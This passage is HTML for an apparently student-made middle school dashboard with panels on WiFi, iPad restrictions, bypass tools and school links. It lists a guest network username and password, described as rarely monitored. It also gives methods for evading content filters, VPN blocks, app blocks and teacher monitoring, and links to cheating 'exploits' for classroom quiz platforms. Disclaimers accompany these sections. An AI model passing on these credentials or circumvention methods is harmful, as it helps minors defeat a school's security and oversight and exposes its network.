      <button onclick="dashboard.togglePanel('studentWebsitesPanel')" data-action="Open Student Websites Info">🌐 Student Website's Information</button>
      <button onclick="dashboard.togglePanel('teacherWebsitesPanel')" data-action="Open Teacher Websites Info">👩‍🏫 Teacher Websites Information</button>
      <button onclick="dashboard.togglePanel('phoneDirectoryPanel')" data-action="Open School Phone Directory">📞 School Phone Directory Information</button>
      <button onclick="dashboard.togglePanel('cameraPanel')" data-action="Open School Camera Info">📷 School Camera Information</button>
      <button onclick="dashboard.togglePanel('schoolInfoPanel')" data-action="Open General School Information">🏫 School Information</button>
      <button onclick="dashboard.togglePanel('exploitPanel')" data-action="Open Exploiting Tools">🧨 Exploiting Tools</button>
      <button onclick="dashboard.togglePanel('bypassPanel')" data-action="Open Bypassing Tools">🚪 Bypassing Tools</button>
      <button onclick="dashboard.togglePanel('vpnPanel')" data-action="Open VPN Websites">🔐 VPN Websites</button>
      <button onclick="dashboard.togglePanel('gamingPanel')" data-action="Open Gaming Websites">🎮 Gaming Websites</button>
      <button onclick="dashboard.togglePanel('musicPanel')" data-action="Open Music Websites">🎵 Music Websites</button>
      <button onclick="dashboard.togglePanel('keyboardPanel')" data-action="Open Keyboard Tricks">🎹 Keyboard Tricks</button>
    </div>

    <!-- NEW SECTION: More 'System-Like' Control Buttons -->
    <div class="system-controls" style="flex-wrap: wrap;"> 
        <button onclick="dashboard.togglePanel('remindersPanel')" data-action="Open Reminders System">📝 Reminders System</button>
        <button onclick="dashboard.togglePanel('settingsPanel')" data-action="Open User Settings">⚙️ User Settings</button>
        <button onclick="dashboard.togglePanel('messagingPanel')" data-action="Open Internal Messages">💬 Internal Messages</button>
        <button onclick="dashboard.togglePanel('fileManagerPanel')" data-action="Open File Explorer (Simulated)">🗄️ File Explorer (Sim)</button>
        <button onclick="dashboard.togglePanel('tasksPanel')" data-action="Open Daily Tasks & Goals">✅ Daily Tasks & Goals</button>
        <button onclick="dashboard.togglePanel('diagnosticsPanel')" data-action="Open System Diagnostics">🩺 System Diagnostics</button>
        <button onclick="dashboard.togglePanel('passGenPanel')" data-action="Open Password Generator">🔑 Password Generator</button>
        <button onclick="dashboard.togglePanel('networkScannerPanel')" data-action="Open Network Scanner (Simulated)">🔍 Network Scanner (Sim)</button>
        <button onclick="dashboard.togglePanel('encryptDecryptPanel')" data-action="Open Encrypt/Decrypt Text Tool">🔒 Encrypt/Decrypt Text</button>
        <button onclick="dashboard.togglePanel('codeEditorPanel')" data-action="Open Code Editor Sandbox">🧑‍💻 Code Editor (Sandbox)</button>
    </div>

    <!-- Information Panels (Existing and NEW) -->
    <div id="infoPanelsContainer" style="margin-top: 20px;">
      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel">
        <h2>📡 School WiFi Information</h2>
        <p>This panel provides detailed information about available school Wi-Fi networks, including security types and any known login credentials.</p>
        <div class="wifi-grid">
          <div>Network Name</div>
          <div>Wifi Level</div>
          <div>Security Type</div>
          <div>Encryption</div>
          <div>Hidden?</div>
          <div>Monitored?</div>
          <div>Username</div>
          <div>Password</div>
        </div>
        
        <div class="wifi-entry">
          <div>Middletown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>No</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown Guest</div>
          <div>Medium</div>
          <div>WPA3 Enterprise</div>
          <div>Medium</div>
          <div>No</div>
          <div>Rare</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
        
        <div class="wifi-entry">
          <div>Radius Test</div>
          <div>Low</div>
          <div>WPA3 Enterprise</div>
          <div>Low</div>
          <div>No</div>
          <div>Rarely</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel">
        <h2>📱 School iPad Restrictions</h2>
        <p>Discover the various restrictions placed on school-issued iPads and potential methods to bypass them for broader functionality.</p>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions')" data-action="View iPad Restrictions">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses')" data-action="View iPad Bypasses">Bypasses</button>
        </div>
        
        <div id="ipadRestrictions" class="ipad-content">
          <h3>Current iPad Restrictions Overview</h3>
          <ul>
              <li>App Store purchasing disabled.</li>
              <li>Installation of unapproved apps blocked.</li>
              <li>Specific websites blacklisted through content filters.</li>
              <li>Certain device functions (e.g., Airdrop, camera for some apps) may be restricted.</li>
              <li>Screen Time limits on app usage.</li>
              <li>Management profiles prevent unauthorized changes.</li>
          </ul>
        </div>
        
        <div id="ipadBypasses" class="ipad-content">
          <h3>Known iPad Bypass Methods (Under Research)</h3>
          <ul>
              <li><strong>Temporary VPN Setup:</strong> Using a temporary VPN profile can sometimes route traffic around content filters. (Requires IT intervention to permanently block, temporary solutions possible).</li>
              <li><strong>Guest User Exploit:</strong> Rarely, creating a guest account on certain OS versions can temporarily grant fewer restrictions. (Often patched quickly).</li>
              <li><strong>DNS Manipulation:</strong> Advanced users might try to modify DNS settings, though this is heavily monitored.</li>
              <li><strong>Local Storage/Cache Exploit:</strong> Exploiting app local storage to bypass filters, often patched by updates.</li>
          </ul>
          <p><em>Disclaimer: Attempting to bypass school security measures may result in disciplinary action. Use this information responsibly.</em></p>
        </div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel">
        <h2>📘 Student Handbooks Information</h2>
        <p>Direct access to the latest student handbooks and district policies. Always stay informed about rules and guidelines.</p>
        <div class="handbook-buttons">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank" data-action="Open Elementary Handbook">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank" data-action="Open Secondary Handbook">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank" data-action="Open District Handbook">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank" data-action="Open RA Academy Handbook">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank" data-action="Open Virtual Learning Plan">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank" data-action="Open Dress Code Policy">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel">
        <h2>🏫 School Building Map Information</h2>
        <p>This section will provide detailed layouts and interactive maps of the school buildings, assisting with navigation.</p>
        <div class="coming-soon">
          Building Map & Interactive Tours Coming Soon! Stay updated for floor plans and key location markers.
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel">
        <h2>🌐 Student Website's Information</h2>
        <p>A curated list of essential educational and school-related websites for students.</p>
        <div class="links-list">
          <a href="https://www.raiderweb.org" target="_blank" data-action="Go to RaiderWeb">RaiderWeb</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank" data-action="Go to Canvas Login">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank" data-action="Go to Care Solace">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank" data-action="Go to Clever Login">Clever Login</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank" data-action="Go to EasyBridge">EasyBridge</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank" data-action="Go to FitnessGram">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank" data-action="Go to Hazing Reporting">Hazing Reporting</a>
          <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank" data-action="Go to MAHS Announcements">MAHS Announcements</a>
          <a href="https://id.naviance.com" target="_blank" data-action="Go to Naviance">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank" data-action="Go to Destiny Library">Destiny Library</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank" data-action="Go to PowerSchool">PowerSchool</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank" data-action="Go to Scholastic">Scholastic</a>
          <a href="https://www.safe2saypa.org" target="_blank" data-action="Go to Safe2Say">Safe2Say</a>
          <a href="https://mail.google.com/mail/" target="_blank" data-action="Go to Gmail">Gmail</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank" data-action="Go to Balfour">Balfour</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank" data-action="Go to LinkIt!">LinkIt!</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <h2>👩‍🏫 Teacher Websites Information</h2>
        <p>A directory of online resources and portals commonly used by school faculty.</p>
        <div class="links-list">
          <a href="https://alo.acadiencelearning.org/login" target="_blank" data-action="Go to Acadience Learning">Acadience Learning</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank" data-action="Go to AIMSweb Plus">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank" data-action="Go to ERP Linq">ERP Linq</a>
          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank" data-action="Go to Barracuda">Barracuda</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank" data-action="Go to Buy Guernsey">Buy Guernsey</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank" data-action="Go to Canvas (Teacher)">Canvas (Teacher)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank" data-action="Go to Care Solace">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank" data-action="Go to Clever (Teacher)">Clever (Teacher)</a>
          <a href="https://www.discoveryeducation.com" target="_blank" data-action="Go to Discovery Education">Discovery Education</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank" data-action="Go to EasyBridge (Teacher)">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank" data-action="Go to FMX">FMX</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank" data-action="Go to FitnessGram">FitnessGram</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank" data-action="Go to Frontline">Frontline</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank" data-action="Go to LinkIt! (Teacher)">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank" data-action="Go to Naviance">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank" data-action="Go to Destiny Library">Destiny Library</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank" data-action="Go to PA eTEP">PA eTEP</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank" data-action="Go to PowerSchool (Teacher)">PowerSchool (Teacher)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank" data-action="Go to Scholastic">Scholastic</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank" data-action="Go to SchoolMessenger">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank" data-action="Go to PDE SAS">PDE SAS</a>
          <a href="https://www.pbisapps.org" target="_blank" data-action="Go to PBIS Apps">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank" data-action="Go to HappyFox">HappyFox</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank" data-action="Go to SafeSchools">SafeSchools</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank" data-action="Go to Office 365">Office 365</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel">
        <h2>📞 School Phone Directory Information</h2>
        <p>A comprehensive directory for all essential school contacts, including administration, faculty, and departments.</p>
        <div class="coming-soon">
          Interactive Phone Directory & Contact Finder Coming Soon! You'll be able to quickly search for staff members and their contact details.
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel">
        <h2>📷 School Camera Information</h2>
        <p>Details about the school's surveillance system, common camera locations, and monitoring policies.</p>
        <div class="coming-soon">
          Detailed Camera Locations & Surveillance Zone Map Coming Soon! Information on specific camera models and coverage will be added.
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel">
        <h2>🏫 School Information</h2>
        <p>Basic facts about Middletown Area Middle School, its key personnel, and contact details.</p>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel">
        <h2>🧨 Exploiting Tools</h2>
        <p>Access to various tools and methods designed to assist with academic or creative tasks in online learning environments.</p>
        <div class="exploit-buttons">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" data-action="Access Blooket Exploit">Blooket Exploit</a>
          <a href="https://sites.google.com/view/tools-2/kahoot-exploit" target="_blank" data-action="Access Kahoot Exploit">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/gimkit-exploit" target="_blank" data-action="Access Gimkit Exploit">Gimkit Exploit</a>
          <a href="https://sites.google.com/view/tools-2/quizlet-exploit" target="_blank" data-action="Access Quizlet Exploit">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/quizzes-exploit" target="_blank" data-action="Access Quizzes Exploit">Quizzes Exploit</a>
          <a href="https://sites.google.com/view/tools-2/quills-exploit" target="_blank" data-action="Access Quills Exploit">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/edpuzzle-exploit" target="_blank" data-action="Access Edpuzzle Exploit">Edpuzzle Exploit</a>
          <a href="https://sites.google.com/view/tools-2/nearpod-exploit" target="_blank" data-action="Access Nearpod Exploit">Nearpod Exploit</a>
        </div>
        <div class="info-text" style="margin-top: 20px;">
          <strong>Disclaimer:</strong> Use these tools responsibly and in accordance with school policies. Unauthorized use may lead to academic and disciplinary consequences. These are provided for informational and ethical testing purposes.
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel">
        <h2>🚪 Bypassing Tools</h2>
        <p>Information and tools that may help in navigating or circumventing certain digital restrictions within the school environment.</p>
        <div class="bypass-buttons">
          <button onclick="dashboard.showBypassContent('bathroom')" data-action="View Bathroom Bypass Strategy">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi')" data-action="View WiFi Bypass Info">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring')" data-action="View Teacher Monitoring Bypass">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('vpnBlock')" data-action="View VPN Block Bypass">VPN Block Bypass</button>
          <button onclick="dashboard.showBypassContent('appBlock')" data-action="View App Block Bypass">App Block Bypass</button>
          <button onclick="dashboard.showBypassContent('filterBypass')" data-action="View Content Filter Bypass">Content Filter Bypass</button>
        </div>
        
        <div id="bathroomBypass" class="bypass-content">
          <h3>Bathroom Break Strategy</h3>
          <p>
            When needing to bypass a locked or monitored bathroom, a few strategies can be considered depending on the context:<br>
            <strong>Emergency Card:</strong> If you have an emergency hall pass or health-related need, present it to a teacher.
            <strong>Buddy System:</strong> Sometimes, approaching with a friend to an area with multiple restrooms can obscure individual monitoring.
            <strong>Timing:</strong> Best times are usually during class changes when hallway traffic is high or just after the lunch rush when custodians are typically not present for cleaning.
            <strong>"Quick Check":</strong> Rapidly entering and exiting without actual use can be less noticed than prolonged loitering.
          </p>
          <p class="caution">Note: This content is for satirical purposes and does not endorse actual rule-breaking.</p>
        </div>
        
        <div id="wifiBypass" class="bypass-content">
          <h3>WiFi Bypass Information</h3>
          <p>Go to the 'School WiFi Information' panel to view network details. Specific credentials and less monitored guest networks are listed there which might offer broader access.</p>
        </div>
        
        <div id="monitoringBypass" class="bypass-content">
          <h3>Teacher Monitoring Bypass</h3>
          <p>
            Strategies to reduce detection by teacher monitoring systems:<br>
            <strong>Private Browsing Modes:</strong> Utilize incognito/private browsing to prevent local history logging. Many monitoring systems still capture active screens.
            <strong>Virtual Desktops:</strong> On devices that support multiple desktops, switching quickly can hide activity.
            <strong>Keyboard Shortcuts:</strong> Learning quick alt-tab (Windows/Linux) or Command-Tab (Mac) combinations to switch to an 'approved' application when a teacher approaches.
            <strong>Ethical Proxies:</strong> Using self-hosted or ethically available proxies to route traffic, though these can be detected.
            <strong>Avoidance:</strong> The best bypass is to not engage in activities that would flag monitoring systems in the first place.
          </p>
          <p class="caution">Note: Attempting to bypass school monitoring may have severe disciplinary consequences. This information is for ethical awareness.</p>
        </div>
        
        <div id="vpnBlockBypass" class="bypass-content">
            <h3>VPN Block Bypass</h3>
            <p>VPN blocks are often implemented by filtering common VPN server IPs or protocols. To bypass this, consider:</p>
            <ul>
                <li>Using VPNs that offer Obfuscated Servers or Stealth Protocols designed to look like regular HTTPS traffic.</li>
                <li>Setting up a personal VPN server on a cloud provider with an unusual port.</li>
                <li>Using web proxies instead of full VPNs for browser traffic, though they offer less security.</li>
                <li>Trying less common VPN protocols if standard OpenVPN/IPSec are blocked.</li>
            </ul>
        </div>
        
        <div id="appBlockBypass" class="bypass-content">
            <h3>App Block Bypass</h3>
            <p>Bypassing application blocks depends heavily on the device management solution:</p>
            <ul>
                <li>**Web-based alternatives:** If an app is blocked, see if there's a web version that might not be.</li>
                <li>**Portable apps:** On Windows, portable versions of software can sometimes run without installation, evading certain blocks.</li>
                <li>**Sandbox environments:** Using a virtual machine or a sandbox (if available) to isolate blocked apps.</li>
                <li>**Custom ROMs/Rooting (for personal devices):** Not applicable for school-issued devices due to high risk and voided warranty/policy violations.</li>
            </ul>
        </div>
        
        <div id="filterBypass" class="bypass-content">
            <h3>Content Filter Bypass</h3>
            <p>Content filters inspect web traffic. Strategies include:</p>
            <ul>
                <li>**Google Translate/Other Translators:** Paste URLs into a translation service to access a translated (and often unfiltered) version.</li>
                <li>**Archiving Sites:** Use services like Archive.is or Wayback Machine to access cached versions of blocked pages.</li>
                <li>**Short URL Services:** Sometimes, filters don't unpack shortened URLs immediately.</li>
                <li>**Using non-standard ports:** If a site is blocked, checking if it's accessible via unusual ports can occasionally work.</li>
            </ul>
        </div>
        
        <div class="info-text" style="margin-top: 20px;">
          <strong>Disclaimer:</strong> This information is for educational purposes regarding system vulnerabilities and mitigation. Unauthorized attempts to bypass school security or content filters are strictly prohibited and may result in serious penalties.
        </div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel">
        <h2>🔐 VPN Websites</h2>
        <p>A list of VPN services that can provide secure and private browsing, potentially useful for accessing restricted content or maintaining anonymity.</p>
        <div class="links-list">
          <a href="https://example-vpn1.com" target="_blank" data-action="Go to VPN Service 1">VPN Service 1</a>
          <a href="https://example-vpn2.com" target="_blank" data-action="Go to VPN Service 2">VPN Service 2</a>
          <a href="https://example-vpn3.com" target="_blank" data-action="Go to VPN Service 3">VPN Service 3</a>
          <a href="https://example-vpn4.com" target="_blank" data-action="Go to VPN Service 4">VPN Service 4</a>
          <a href="https://protonvpn.com" target="_blank" data-action="Go to ProtonVPN">ProtonVPN</a>
          <a href="https://nordvpn.com" target="_blank" data-action="Go to NordVPN">NordVPN</a>
          <a href="https://expressvpn.com" target="_blank" data-action="Go to ExpressVPN">ExpressVPN</a>
          <a href="https://windscribe.com" target="_blank" data-action="Go to Windscribe">Windscribe</a>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel">
        <h2>🎮 Gaming Websites</h2>
        <p>A curated collection of online gaming websites, suitable for quick breaks or during free study periods.</p>
        <div class="coming-soon">
          COMING SOON: A selection of browser-based games, unblocked gaming sites, and resources to help you relax during downtime.
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel">
        <h2>🎵 Music Websites</h2>
        <p>Links to various music streaming and discovery platforms, to accompany your study sessions or for leisure.</p>
        <div class="coming-soon">
          COMING SOON: Access to unblocked music sites, internet radio, and music creation tools.
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel">
        <h2>🎹 Keyboard Tricks</h2>
        <p>Essential keyboard shortcuts and tips to enhance productivity and system navigation across various applications.</p>
        <div class="info-text">
          <p>System Shortcuts:
• Access Spotlight Search: Press Command (⌘) + Space bar.
• Return to the Home screen: Press Command (⌘) + H.
• Show the Dock: Press Command (⌘) + Option (⌥) + D.
• Show the App Library: Press Shift (⇧) + Globe + A.
• Open Quick Note: Press Globe + Q.
• Open Siri: Press Globe + S.
• Open Control Center: Press Globe + C.
• Open Notification Center: Press Globe + N.
• Show all windows: Press Globe + Down Arrow.
• Open the App Switcher: Press Globe + Up Arrow.
Multitasking Shortcuts:
• Switch to the last active app: Press Command (⌘) + Tab.
• View all active apps: Press and hold Command (⌘) + Tab.
• Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.
• Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.
• Open Slide Over: Press Globe + Backslash.
• Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.
Safari and App-Specific Shortcuts:
• Take a full-screen screenshot: Press Command (⌘) + Shift + 3.
• Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.
• Open a new private tab: Press Command (⌘) + Shift + N.
• Open a new tab: Press Command (⌘) + T or Command (⌘) + N.
• Close the current tab: Press Command (⌘) + W.
• Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.
• Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.
• Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.
• Reopen the last closed tab: Press Shift + Command (⌘) + T.
• Go to a specific tab (1-8): Press Command (⌘) + (1-8).
• Go to the last tab: Press Command (⌘) + 9.
• Open the Tab Grid: Press Shift + Command (⌘) + .
• Open a new Incognito tab: Press Shift + Command (⌘) + N.
• Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.
• Open a new window: Press Option (⌥) + Command (⌘) + N.
General Navigation and Text Editing:
• Navigate between elements in an app (like fields, lists, buttons): Press Tab.
• Select all text: Press Command (⌘) + A.
• Copy selected text: Press Command (⌘) + C.
• Cut selected text: Press Command (⌘) + X.
• Paste copied text: Press Command (⌘) + V.
• Undo the last action: Press Command (⌘) + Z.
• Redo the last undone action: Press Command (⌘) + Shift + Z.
• Jump to the top of a page: Press Command (⌘) + Up Arrow.
• Jump to the bottom of a page: Press Command (⌘) + Down Arrow.
• Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
        </div>
      </div>
    
      <!-- NEW PANELS START HERE -->
      <!-- Reminders Panel - NEW -->
      <div id="remindersPanel" class="info-panel">
          <h2>📝 Reminder System</h2>
          <p>Set up important reminders to keep track of tasks, events, and due dates. Never miss a deadline again!</p>
          <form id="reminderForm">
              <input type="text" id="reminderText" placeholder="Enter reminder description" required>
              <input type="datetime-local" id="reminderDateTime" required>
              <button type="submit" data-action="Add Reminder">Add Reminder</button>
          </form>
          <ul id="remindersList" style="margin-top: 20px;">
              <!-- Reminders will be loaded here -->
          </ul>
      </div>

      <!-- Settings Panel - NEW -->
      <div id="settingsPanel" class="info-panel">
          <h2>⚙️ User Settings</h2>
          <p>Customize your dashboard experience with various themes, fonts, and interface options.</p>

          <div class="setting-item">
              <label for="themeColorPrimary">Primary Accent Color:</label>
              <div class="setting-control">
                  <input type="color" id="themeColorPrimary" value="#ff914d">
              </div>
          </div>
          <div class="setting-item">
              <label for="themeColorSecondary">Secondary Accent Color:</label>
              <div class="setting-control">
                  <input type="color" id="themeColorSecondary" value="#ffd966">
              </div>
          </div>
          <div class="setting-item">
              <label for="baseFontSize">Base Font Size:</label>
              <div class="setting-control">
                  <input type="range" id="baseFontSize" min="12" max="18" value="14">
                  <span id="baseFontSizeDisplay">14px</span>
              </div>
          </div>
          <div class="setting-item">
              <label for="dashboardFont">Dashboard Font:</label>
              <div class="setting-control">
                  <select id="dashboardFont">
                      <option value="'Montserrat', sans-serif">Montserrat (Default)</option>
                      <option value="'Segoe UI', sans-serif">Segoe UI</option>
                      <option value="'Roboto Mono', monospace">Roboto Mono</option>
                      <option value="'Open Sans', sans-serif">Open Sans</option>
                      <option value="'Pacifico', cursive">Pacifico</option>
                  </select>
              </div>
          </div>
          <button id="applySettingsBtn" class="apply-settings" data-action="Apply User Settings">Apply Settings</button>
          <p class="info-text" style="margin-top: 15px;"><em>Note: Changing accent colors will affect most interactive elements and highlights. Changes persist locally.</em></p>
      </div>

      <!-- Messaging Panel - NEW -->
      <div id="messagingPanel" class="info-panel">
          <h2>💬 Internal Message Center</h2>
          <p>A private messaging system for internal notes or simulated communications. Messages are stored locally.</p>
          <div class="chat-window" id="chatWindow">
              <!-- Messages will load here -->
          </div>
          <div class="message-input-area">
              <input type="text" id="messageInput" placeholder="Type your message..." autocomplete="off">
              <button id="sendMessageBtn" data-action="Send Message">Send</button>
          </div>
          <div class="info-text" style="margin-top: 15px;">
            <p>This is a simulated message system for personal notes or role-playing. It does not send actual messages outside this interface.</p>
          </div>
      </div>

      <!-- File Manager Panel - NEW -->
      <div id="fileManagerPanel" class="info-panel">
          <h2>🗄️ File Explorer (Simulated)</h2>
          <p>Navigate a simulated file system. Create, open, and manage (mock) files and folders.</p>
          <div class="file-structure" id="fileStructure">
              <ul>
                  <li data-path="/Root" data-type="folder" class="folder-icon">Root</li>
              </ul>
          </div>
          <div class="file-actions">
              <input type="text" id="newFileName" placeholder="New file/folder name" style="flex-grow: 1; margin-bottom: 0;">
              <button id="createFolderBtn" data-action="Create Simulated Folder">New Folder</button>
